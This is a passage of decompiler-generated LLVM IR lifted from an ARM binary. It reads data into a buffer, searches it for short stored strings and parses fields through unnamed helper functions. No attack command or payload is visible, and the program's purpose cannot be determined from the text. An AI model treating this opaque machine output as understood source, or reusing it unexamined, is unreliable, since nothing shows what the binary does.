  %v3_8e40 = call i32 @function_10b20(i32 %v0_8e38, i32 %v1_8e34, i32 960)
  store i32 %v3_8e40, i32* %r0.global-to-local, align 4
  %v0_8e44 = load i32, i32* @sl, align 4
  %v1_8e44 = add i32 %v0_8e44, 660
  %v2_8e44 = inttoptr i32 %v1_8e44 to i32*
  %v3_8e44 = load i32, i32* %v2_8e44, align 4
  store i32 %v3_8e44, i32* %r3.global-to-local, align 4
  %v1_8e48 = add i32 %v3_8e44, -64
  store i32 %v1_8e48, i32* @r4, align 4
  store i32 %v1_8e48, i32* %v2_8e44, align 4
  br label %dec_label_pc_8d34

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8d7c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_8e5c = call i32 @function_efe8(i32 36, i32* null)
  %v0_8e60 = load i32, i32* @r4, align 4
  store i32 %v0_8e60, i32* %r1.global-to-local, align 4
  store i32 %v3_8e5c, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8e6c = load i32, i32* @r7, align 4
  store i32 %v0_8e6c, i32* %r0.global-to-local, align 4
  %v4_8e70 = call i32 @function_f9f4(i32 %v0_8e6c, i32 %v0_8e60, i32 %v3_8e5c, i32 11)
  store i32 %v4_8e70, i32* %r0.global-to-local, align 4
  %v3_8e74 = icmp eq i32 %v4_8e70, -1
  store i1 %v3_8e74, i1* %cpsr_c.global-to-local, align 1
  %v8_8e74 = icmp eq i32 %v4_8e70, -1
  store i1 %v8_8e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8e74, label %dec_label_pc_8e7c, label %dec_label_pc_994c

dec_label_pc_8e7c:                                ; preds = %dec_label_pc_8e54
  %v0_8e7c = load i32, i32* @sl, align 4
  %v1_8e7c = add i32 %v0_8e7c, 12
  %v2_8e7c = inttoptr i32 %v1_8e7c to i32*
  %v3_8e7c = load i32, i32* %v2_8e7c, align 4
  store i32 %v3_8e7c, i32* @r5, align 4
  br label %dec_label_pc_8da0

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8da8
  %v0_8e84 = load i32, i32* @r7, align 4
  store i32 %v0_8e84, i32* %r0.global-to-local, align 4
  %v1_8e88 = add i32 %v0_8da8, 660
  %v2_8e88 = inttoptr i32 %v1_8e88 to i32*
  %v3_8e88 = load i32, i32* %v2_8e88, align 4
  store i32 %v3_8e88, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8e94 = call i32 @function_f9f4(i32 %v0_8e84, i32 %v3_8e88, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  store i32 %v5_8e94, i32* %r0.global-to-local, align 4
  %v2_8e98 = icmp eq i32 %v5_8e94, -1
  store i1 %v2_8e98, i1* %cpsr_c.global-to-local, align 1
  %v7_8e98 = icmp eq i32 %v5_8e94, -1
  store i1 %v7_8e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e98, label %dec_label_pc_8dc8, label %dec_label_pc_8ea0

dec_label_pc_8ea0:                                ; preds = %dec_label_pc_8e84
  %v0_8ea0 = load i32, i32* @sl, align 4
  %v1_8ea0 = add i32 %v0_8ea0, 660
  %v2_8ea0 = inttoptr i32 %v1_8ea0 to i32*
  %v3_8ea0 = load i32, i32* %v2_8ea0, align 4
  store i32 %v3_8ea0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8eac = load i32, i32* @r7, align 4
  store i32 %v0_8eac, i32* %r0.global-to-local, align 4
  %v5_8eb0 = call i32 @function_f9f4(i32 %v0_8eac, i32 %v3_8ea0, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  %v0_8eb4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8eb4 = add i32 %v0_8eb4, %v5_8eb0
  store i32 %v2_8eb4, i32* %ip.global-to-local, align 4
  store i32 %v5_8eb0, i32* @r6, align 4
  store i32 %v5_8eb0, i32* %r1.global-to-local, align 4
  %v0_8ec0 = load i32, i32* @r7, align 4
  store i32 %v0_8ec0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32* %r2.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r4, align 4
  store i32 %v0_8ec8, i32* %r3.global-to-local, align 4
  %v0_8ecc = load i32, i32* @r5, align 4
  %v1_8ecc = trunc i32 %v0_8ecc to i8
  %v3_8ecc = add i32 %v2_8eb4, 2114
  %v4_8ecc = inttoptr i32 %v3_8ecc to i8*
  store i8 %v1_8ecc, i8* %v4_8ecc, align 1
  %v4_8ed0 = call i32 @function_f9f4(i32 %v0_8ec0, i32 %v5_8eb0, i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32 %v0_8ec8)
  store i32 %v4_8ed0, i32* %r0.global-to-local, align 4
  %v2_8ed4 = icmp eq i32 %v4_8ed0, -1
  store i1 %v2_8ed4, i1* %cpsr_c.global-to-local, align 1
  %v7_8ed4 = icmp eq i32 %v4_8ed0, -1
  store i1 %v7_8ed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ed4, label %dec_label_pc_8ef8, label %dec_label_pc_8edc

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ea0
  %v0_8edc = load i32, i32* @r7, align 4
  store i32 %v0_8edc, i32* %r0.global-to-local, align 4
  %v0_8ee0 = load i32, i32* @r6, align 4
  store i32 %v0_8ee0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32* %r2.global-to-local, align 4
  %v0_8ee8 = load i32, i32* @r4, align 4
  store i32 %v0_8ee8, i32* %r3.global-to-local, align 4
  %v4_8eec = call i32 @function_f9f4(i32 %v0_8edc, i32 %v0_8ee0, i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32 %v0_8ee8)
  %v0_8ef0 = load i32, i32* %sb.global-to-local, align 4
  %v2_8ef0 = add i32 %v0_8ef0, %v4_8eec
  store i32 %v2_8ef0, i32* %r0.global-to-local, align 4
  %v0_8ef4 = load i32, i32* @r5, align 4
  %v1_8ef4 = trunc i32 %v0_8ef4 to i8
  %v3_8ef4 = add i32 %v2_8ef0, 2116
  %v4_8ef4 = inttoptr i32 %v3_8ef4 to i8*
  store i8 %v1_8ef4, i8* %v4_8ef4, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ea0, %dec_label_pc_8edc
  %v0_8ef8 = load i32, i32* @r7, align 4
  store i32 %v0_8ef8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f00 = inttoptr i32 %v0_8ef8 to i8*
  %v3_8f00 = call i32 @function_fa60(i8* %v2_8f00, i32 16)
  store i32 %v3_8f00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f04 = icmp eq i32 %v3_8f00, 0
  store i1 %v2_8f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f04, label %dec_label_pc_9b00, label %dec_label_pc_8f0c

dec_label_pc_8f0c:                                ; preds = %dec_label_pc_8ef8
  %v1_8f0c = add i32 %v3_8f00, 2
  store i32 %v1_8f0c, i32* %r3.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v2_8f10 = add i32 %v1_8f10, 12
  %v3_8f10 = inttoptr i32 %v2_8f10 to i32*
  store i32 %v1_8f0c, i32* %v3_8f10, align 4
  br label %dec_label_pc_8dc8

dec_label_pc_8f18:                                ; preds = %dec_label_pc_8584
  %v2_8f18 = inttoptr i32 %v1_85d8 to i32*
  %v3_8f18 = load i32, i32* %v2_8f18, align 4
  store i32 %v3_8f18, i32* %ip.global-to-local, align 4
  %v3_8f20 = udiv i32 %v3_8f18, 32
  %v3_8f24 = mul nuw nsw i32 %v3_8f20, 4
  store i32 %v2_86d0, i32* @lr, align 4
  %v2_8f2c = add i32 %v3_8f24, %v2_86d0
  store i32 %v2_8f2c, i32* %r2.global-to-local, align 4
  %v1_8f30 = add i32 %v2_8f2c, -164
  %v2_8f30 = inttoptr i32 %v1_8f30 to i32*
  %v3_8f30 = load i32, i32* %v2_8f30, align 4
  %v1_8f34 = urem i32 %v3_8f18, 32
  store i32 %v1_8f34, i32* %r0.global-to-local, align 4
  store i32 %v1_857c, i32* %r3.global-to-local, align 4
  %v7_8f3c = shl i32 %v1_857c, %v1_8f34
  %v8_8f3c = or i32 %v3_8f30, %v7_8f3c
  store i32 %v8_8f3c, i32* %r1.global-to-local, align 4
  %v1_8f40 = load i32, i32* @r8, align 4
  %v2_8f40 = sub i32 %v3_8f18, %v1_8f40
  %v3_8f40 = icmp uge i32 %v3_8f18, %v1_8f40
  store i1 %v3_8f40, i1* %cpsr_c.global-to-local, align 1
  %v4_8f40 = xor i32 %v1_8f40, %v3_8f18
  %v5_8f40 = xor i32 %v2_8f40, %v3_8f18
  %v6_8f40 = and i32 %v5_8f40, %v4_8f40
  %v7_8f40 = icmp slt i32 %v6_8f40, 0
  %v8_8f40 = icmp slt i32 %v2_8f40, 0
  %v9_8f40 = icmp eq i32 %v3_8f18, %v1_8f40
  store i1 %v9_8f40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f3c, i32* %v2_8f30, align 4
  %v3_8f48 = xor i1 %v8_8f40, %v7_8f40
  %v4_8f48 = or i1 %v9_8f40, %v3_8f48
  br i1 %v4_8f48, label %dec_label_pc_85b4, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f18
  %v0_8f4c = load i32, i32* %ip.global-to-local, align 4
  %v1_8f4c = load i32, i32* %r3.global-to-local, align 4
  %v2_8f4c = add i32 %v1_8f4c, %v0_8f4c
  store i32 %v2_8f4c, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_8f54:                                ; preds = %dec_label_pc_8808
  store i32 %v3_884c, i32* %r0.global-to-local, align 4
  %v1_8f58 = call i32 @function_10608(i32 %v3_884c)
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8f60 = load i32, i32* @sl, align 4
  %v2_8f60 = add i32 %v1_8f60, -1452
  %v3_8f60 = inttoptr i32 %v2_8f60 to i32*
  store i32 -1, i32* %v3_8f60, align 4
  %v0_8f64 = load i32, i32* @r5, align 4
  %v1_8f64 = trunc i32 %v0_8f64 to i8
  %v2_8f64 = load i32, i32* @sl, align 4
  %v3_8f64 = add i32 %v2_8f64, -1448
  %v4_8f64 = inttoptr i32 %v3_8f64 to i8*
  store i8 %v1_8f64, i8* %v4_8f64, align 1
  br label %dec_label_pc_87ac

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_858c
  %v2_8f6c = inttoptr i32 %v1_85d8 to i32*
  %v3_8f6c = load i32, i32* %v2_8f6c, align 4
  store i32 %v3_8f6c, i32* %ip.global-to-local, align 4
  %v3_8f74 = udiv i32 %v3_8f6c, 32
  store i32 %v2_86d0, i32* %r1.global-to-local, align 4
  %v3_8f7c = mul nuw nsw i32 %v3_8f74, 4
  %v2_8f80 = add i32 %v3_8f7c, %v2_86d0
  store i32 %v2_8f80, i32* %r2.global-to-local, align 4
  %v1_8f84 = add i32 %v2_8f80, -164
  %v2_8f84 = inttoptr i32 %v1_8f84 to i32*
  %v3_8f84 = load i32, i32* %v2_8f84, align 4
  %v1_8f88 = urem i32 %v3_8f6c, 32
  store i32 %v1_8f88, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8f90 = shl i32 1, %v1_8f88
  %v8_8f90 = or i32 %v3_8f84, %v7_8f90
  store i32 %v8_8f90, i32* %r1.global-to-local, align 4
  %v1_8f94 = load i32, i32* @r8, align 4
  %v2_8f94 = sub i32 %v3_8f6c, %v1_8f94
  %v3_8f94 = icmp uge i32 %v3_8f6c, %v1_8f94
  store i1 %v3_8f94, i1* %cpsr_c.global-to-local, align 1
  %v4_8f94 = xor i32 %v1_8f94, %v3_8f6c
  %v5_8f94 = xor i32 %v2_8f94, %v3_8f6c
  %v6_8f94 = and i32 %v5_8f94, %v4_8f94
  %v7_8f94 = icmp slt i32 %v6_8f94, 0
  %v8_8f94 = icmp slt i32 %v2_8f94, 0
  %v9_8f94 = icmp eq i32 %v3_8f6c, %v1_8f94
  store i1 %v9_8f94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f90, i32* %v2_8f84, align 4
  %v3_8f9c = xor i1 %v8_8f94, %v7_8f94
  %v4_8f9c = or i1 %v9_8f94, %v3_8f9c
  br i1 %v4_8f9c, label %dec_label_pc_85b4, label %dec_label_pc_8fa0

dec_label_pc_8fa0:                                ; preds = %dec_label_pc_8f6c
  %v0_8fa0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fa0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fa0 = add i32 %v1_8fa0, %v0_8fa0
  store i32 %v2_8fa0, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8790
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_8ff0 = call i32 @function_f9d0(i32 %v2_823c, i32 10240)
  store i32 %v2_8ff0, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_8ffc = load i32, i32* @sl, align 4
  %v1_8ffc = add i32 %v0_8ffc, -1452
  %v2_8ffc = inttoptr i32 %v1_8ffc to i32*
  %v3_8ffc = load i32, i32* %v2_8ffc, align 4
  store i32 %v3_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9008 = call i32 @function_10cc0(i32 %v3_8ffc, i32 %v2_823c, i32 10240, i32 16386)
  store i32 %v4_9008, i32* %r0.global-to-local, align 4
  store i32 %v4_9008, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9010 = icmp eq i32 %v4_9008, 0
  store i1 %v2_9010, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp181 = icmp slt i32 %v4_9008, 1
  br i1 %tmp181, label %dec_label_pc_9510, label %dec_label_pc_901c

dec_label_pc_901c:                                ; preds = %dec_label_pc_8fe8
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  store i32 %v4_9008, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_159d4.38 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_902c = call i32 @function_f9f4(i32 %v2_823c, i32 %v4_9008, i32 ptrtoint ([5 x i8]* @global_var_159d4.38 to i32), i32 4)
  store i32 %v5_902c, i32* %r0.global-to-local, align 4
  %v3_9030 = icmp eq i32 %v5_902c, -1
  store i1 %v3_9030, i1* %cpsr_c.global-to-local, align 1
  %v8_9030 = icmp eq i32 %v5_902c, -1
  store i1 %v8_9030, i1* %cpsr_z.global-to-local, align 1
  %v0_9038 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v3_9030, label %dec_label_pc_9038, label %dec_label_pc_9040

dec_label_pc_9038:                                ; preds = %dec_label_pc_901c
  %v3_9038 = icmp ugt i32 %v0_9038, 10239
  store i1 %v3_9038, i1* %cpsr_c.global-to-local, align 1
  %v8_9038 = icmp eq i32 %v0_9038, 10240
  store i1 %v8_9038, i1* %cpsr_z.global-to-local, align 1
  %v5_903c = icmp slt i32 %v0_9038, 10240
  br i1 %v5_903c, label %dec_label_pc_87ac, label %dec_label_pc_9040

dec_label_pc_9040:                                ; preds = %dec_label_pc_901c, %dec_label_pc_9038
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_159d4.38 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_9038, i32* %r1.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v5_9050 = call i32 @function_f9f4(i32 %v2_823c, i32 %v0_9038, i32 ptrtoint ([5 x i8]* @global_var_159d4.38 to i32), i32 4)
  store i32 %v2_823c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_905c = add i32 %v5_9050, %v2_823c
  %v5_905c = inttoptr i32 %v4_905c to i8*
  store i8 0, i8* %v5_905c, align 1
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9068 = inttoptr i32 %v0_9060 to i32*
  %v3_9068 = call i32 @function_efe8(i32 46, i32* %v2_9068)
  %v0_906c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_906c, i32* @r1, align 4
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_9078 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_906c, i32 %v3_9068)
  store i32 %v4_9078, i32* %r0.global-to-local, align 4
  %v2_907c = icmp eq i32 %v4_9078, -1
  store i1 %v2_907c, i1* %cpsr_c.global-to-local, align 1
  %v7_907c = icmp eq i32 %v4_9078, -1
  store i1 %v7_907c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_907c, label %.thread23, label %bb182

bb182:                                            ; preds = %dec_label_pc_9040
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_9084 = load i32, i32* @sl, align 4
  %v3_9084 = inttoptr i32 %v2_9084 to i32*
  store i32 2, i32* %v3_9084, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_9040, %bb182
  %v0_9088 = load i32, i32* @r5, align 4
  store i32 %v0_9088, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_9090 = inttoptr i32 %v0_9088 to i32*
  %v3_9090 = call i32 @function_efe8(i32 45, i32* %v2_9090)
  %v0_9094 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9094, i32* @r1, align 4
  store i32 %v3_9090, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_90a0 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_9094, i32 %v3_9090)
  store i32 %v4_90a0, i32* %r0.global-to-local, align 4
  %v2_90a4 = icmp eq i32 %v4_90a0, -1
  store i1 %v2_90a4, i1* %cpsr_c.global-to-local, align 1
  %v7_90a4 = icmp eq i32 %v4_90a0, -1
  store i1 %v7_90a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90a4, label %.thread24, label %bb183

bb183:                                            ; preds = %.thread23
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_90ac = load i32, i32* @sl, align 4
  %v3_90ac = inttoptr i32 %v2_90ac to i32*
  store i32 1, i32* %v3_90ac, align 4
  br label %.thread24

.thread24:                                        ; preds = %.thread23, %bb183
  %v0_90b0 = load i32, i32* @r5, align 4
  store i32 %v0_90b0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_90b8 = load i32, i32* @sl, align 4
  %v2_90b8 = add i32 %v1_90b8, 4
  %v3_90b8 = inttoptr i32 %v2_90b8 to i32*
  store i32 %v0_90b0, i32* %v3_90b8, align 4
  %v2_90bc = inttoptr i32 %v0_90b0 to i32*
  %v3_90bc = call i32 @function_efe8(i32 44, i32* %v2_90bc)
  %v0_90c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90c0, i32* @r1, align 4
  store i32 %v3_90bc, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_90cc = call i32 @function_fc8c(i8* %tmp168, i32 %v0_90c0, i32 %v3_90bc)
  store i32 %v4_90cc, i32* %r0.global-to-local, align 4
  %v2_90d0 = icmp eq i32 %v4_90cc, -1
  store i1 %v2_90d0, i1* %cpsr_c.global-to-local, align 1
  %v7_90d0 = icmp eq i32 %v4_90cc, -1
  store i1 %v7_90d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90d0, label %.thread25, label %dec_label_pc_90d8

dec_label_pc_90d8:                                ; preds = %.thread24
  %v0_90d8 = load i32, i32* @r5, align 4
  store i32 %v0_90d8, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_90e0 = inttoptr i32 %v0_90d8 to i32*
  %v3_90e0 = call i32 @function_efe8(i32 44, i32* %v2_90e0)
  %v0_90e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90e4, i32* @r1, align 4
  store i32 %v3_90e0, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_90f0 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_90e4, i32 %v3_90e0)
  store i32 %v4_90f0, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* @lr, align 4
  %v2_90f8 = add i32 %v4_90f0, %v2_823c
  %v3_90f8 = inttoptr i32 %v2_90f8 to i8*
  %v4_90f8 = load i8, i8* %v3_90f8, align 1
  %v2_9100 = icmp ugt i8 %v4_90f8, 31
  store i1 %v2_9100, i1* %cpsr_c.global-to-local, align 1
  %v7_9100 = icmp eq i8 %v4_90f8, 32
  store i1 %v7_9100, i1* %cpsr_z.global-to-local, align 1
  %v2_9108 = zext i1 %v7_9100 to i32
  %v2_9108.v4_90f0 = add i32 %v2_9108, %v4_90f0
  store i32 %v2_9108.v4_90f0, i32* @r4, align 4
  %v2_910c = add i32 %v2_9108.v4_90f0, %v2_823c
  store i32 %v2_910c, i32* @r6, align 4
  store i32 %v2_910c, i32* %r0.global-to-local, align 4
  %v1_9114 = load i32, i32* %fp.global-to-local, align 4
  %v2_9114 = sub i32 %v1_9114, %v2_9108.v4_90f0
  store i32 %v2_9114, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9120 = call i32 @function_f9f4(i32 %v2_910c, i32 %v2_9114, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  store i32 %v5_9120, i32* %r0.global-to-local, align 4
  %v2_9124 = icmp eq i32 %v5_9120, -1
  store i1 %v2_9124, i1* %cpsr_c.global-to-local, align 1
  %v7_9124 = icmp eq i32 %v5_9120, -1
  store i1 %v7_9124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9124, label %.thread25, label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %dec_label_pc_90d8
  %v2_912c = icmp ne i32 %v5_9120, 0
  store i1 %v2_912c, i1* %cpsr_c.global-to-local, align 1
  %v7_912c = icmp eq i32 %v5_9120, 1
  store i1 %v7_912c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %r2.global-to-local, align 4
  %v7_9134 = icmp slt i32 %v5_9120, 2
  br i1 %v7_9134, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_912c
  %v9_9134 = add i32 %v5_9120, -2
  store i32 %v9_9134, i32* %r0.global-to-local, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_912c, %bb184
  %v1_913c = phi i32 [ %v5_9120, %dec_label_pc_912c ], [ %v9_9134, %bb184 ]
  store i32 %v2_86d0, i32* %r2.global-to-local, align 4
  %v2_913c = add i32 %v1_913c, %v2_86d0
  %v1_9140 = load i32, i32* @r4, align 4
  %v2_9140 = add i32 %v2_913c, %v1_9140
  store i32 %v2_9140, i32* %r3.global-to-local, align 4
  %v0_9144 = load i32, i32* @r5, align 4
  %v1_9144 = trunc i32 %v0_9144 to i8
  %v3_9144 = load i32, i32* @r7, align 4
  %v4_9144 = add i32 %v3_9144, %v2_9140
  %v5_9144 = inttoptr i32 %v4_9144 to i8*
  store i8 %v1_9144, i8* %v5_9144, align 1
  %v0_9148 = load i32, i32* @r6, align 4
  store i32 %v0_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v0_9148 to i8*
  %v2_914c = call i32 @function_f93c(i8* %v1_914c)
  %v0_9150 = load i32, i32* @r5, align 4
  store i32 %v0_9150, i32* %r1.global-to-local, align 4
  store i32 %v2_914c, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_915c = inttoptr i32 %v0_9150 to i32*
  %v3_915c = call i32 @function_efe8(i32 43, i32* %v2_915c)
  %v0_9160 = load i32, i32* @r4, align 4
  store i32 %v0_9160, i32* @r1, align 4
  store i32 %v3_915c, i32* %r2.global-to-local, align 4
  %v0_9168 = load i32, i32* @r6, align 4
  store i32 %v0_9168, i32* %r0.global-to-local, align 4
  %v3_916c = inttoptr i32 %v0_9168 to i8*
  %v4_916c = call i32 @function_fc8c(i8* %v3_916c, i32 %v0_9160, i32 %v3_915c)
  store i32 %v4_916c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9170 = icmp eq i32 %v4_916c, 0
  store i1 %v2_9170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9170, label %.thread25, label %bb186

bb186:                                            ; preds = %bb185
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9178 = load i32, i32* @sl, align 4
  %v3_9178 = add i32 %v2_9178, 4
  %v4_9178 = inttoptr i32 %v3_9178 to i32*
  store i32 1, i32* %v4_9178, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb185, %dec_label_pc_90d8, %.thread24, %bb186
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9188 = load i32, i32* @sl, align 4
  %v2_9188 = add i32 %v1_9188, 8
  %v3_9188 = inttoptr i32 %v2_9188 to i32*
  store i32 0, i32* %v3_9188, align 4
  %v3_918c = call i32 @function_efe8(i32 41, i32* null)
  %v0_9190 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9190, i32* @r1, align 4
  store i32 %v3_918c, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_919c = call i32 @function_fc8c(i8* %tmp168, i32 %v0_9190, i32 %v3_918c)
  store i32 %v4_919c, i32* %r0.global-to-local, align 4
  %v2_91a4 = icmp eq i32 %v4_919c, -1
  store i1 %v2_91a4, i1* %cpsr_c.global-to-local, align 1
  %v7_91a4 = icmp eq i32 %v4_919c, -1
  store i1 %v7_91a4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_91a4, label %.thread26, label %dec_label_pc_91b0

dec_label_pc_91b0:                                ; preds = %.thread25
  %v0_91b0 = load i32, i32* @r7, align 4
  store i32 %v0_91b0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_91b8 = inttoptr i32 %v0_91b0 to i32*
  %v3_91b8 = call i32 @function_efe8(i32 41, i32* %v2_91b8)
  %v0_91bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91bc, i32* @r1, align 4
  store i32 %v3_91b8, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_91c8 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_91bc, i32 %v3_91b8)
  store i32 %v4_91c8, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %ip.global-to-local, align 4
  %v2_91d0 = add i32 %v4_91c8, %v2_823c
  %v3_91d0 = inttoptr i32 %v2_91d0 to i8*
  %v4_91d0 = load i8, i8* %v3_91d0, align 1
  store i32 %v2_823c, i32* @lr, align 4
  %v2_91d8 = icmp ugt i8 %v4_91d0, 31
  store i1 %v2_91d8, i1* %cpsr_c.global-to-local, align 1
  %v7_91d8 = icmp eq i8 %v4_91d0, 32
  store i1 %v7_91d8, i1* %cpsr_z.global-to-local, align 1
  %v2_91e0 = zext i1 %v7_91d8 to i32
  %v2_91e0.v4_91c8 = add i32 %v2_91e0, %v4_91c8
  store i32 %v2_91e0.v4_91c8, i32* @r4, align 4
  %v2_91e4 = add i32 %v2_91e0.v4_91c8, %v2_823c
  store i32 %v2_91e4, i32* @r5, align 4
  store i32 %v2_91e4, i32* %r0.global-to-local, align 4
  %v1_91ec = load i32, i32* %fp.global-to-local, align 4
  %v2_91ec = sub i32 %v1_91ec, %v2_91e0.v4_91c8
  store i32 %v2_91ec, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_91f8 = call i32 @function_f9f4(i32 %v2_91e4, i32 %v2_91ec, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  store i32 %v5_91f8, i32* %r0.global-to-local, align 4
  %v2_91fc = icmp eq i32 %v5_91f8, -1
  store i1 %v2_91fc, i1* %cpsr_c.global-to-local, align 1
  %v7_91fc = icmp eq i32 %v5_91f8, -1
  store i1 %v7_91fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91fc, label %.thread26, label %dec_label_pc_9204

dec_label_pc_9204:                                ; preds = %dec_label_pc_91b0
  %v2_9204 = icmp ne i32 %v5_91f8, 0
  store i1 %v2_9204, i1* %cpsr_c.global-to-local, align 1
  %v7_9204 = icmp eq i32 %v5_91f8, 1
  store i1 %v7_9204, i1* %cpsr_z.global-to-local, align 1
